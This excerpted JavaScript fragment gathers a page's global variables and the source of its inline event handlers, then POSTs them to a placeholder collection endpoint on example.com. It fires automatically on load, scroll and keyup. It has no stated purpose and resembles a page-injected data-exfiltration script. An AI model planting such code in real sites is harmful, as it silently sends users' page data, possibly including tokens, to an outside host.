...
function gatherGlobalVars() {
  ...
  for (const prop in window) {
    if (window.hasOwnProperty(prop) && window[prop] instanceof Object) {
...
function collectJsHooks() {
  const jsHooks = ['onclick', 'onload', 'onchange', 'onmouseover', 'onmouseout', 'onkeydown', 'onkeyup'];
  const elements = document.getElementsByTagName('*');
  const collectedHooks = {};
  for (let i = 0; i < elements.length; i++) {
    for (const hook of jsHooks) {
      if (typeof elements[i][hook] === 'function') {
        collectedHooks[elements[i].nodeName + ":" + hook] = elements[i][hook].toString();
      }
    }
  }
  return collectedHooks;
}
...
async function postDataToServer(data) {
  try {
    await fetch('https://example.com/api/collect', {
      method: 'POST',
      headers: {
...
window.document.onload = window.document.onscroll = document.onkeyup = gatherAndPushData;
...
build time: Dec 4 22:05
*/
document.addEventListener('DOMContentLoaded', gatherAndPushData);
